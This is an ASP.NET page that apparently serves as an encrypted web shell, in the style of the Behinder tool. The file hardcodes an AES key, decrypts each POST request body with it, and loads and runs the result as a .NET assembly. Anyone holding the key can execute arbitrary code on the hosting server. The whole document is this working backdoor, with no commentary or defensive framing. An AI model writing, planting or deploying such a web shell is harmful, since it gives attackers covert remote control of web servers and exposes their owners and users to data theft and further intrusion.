<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<%
Session.Add("k","42b842fc69195c9d");
byte[] k = Encoding.UTF8.GetBytes(Session[0] + "");
byte[] c = Request.BinaryRead(Request.ContentLength);
Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);
%>
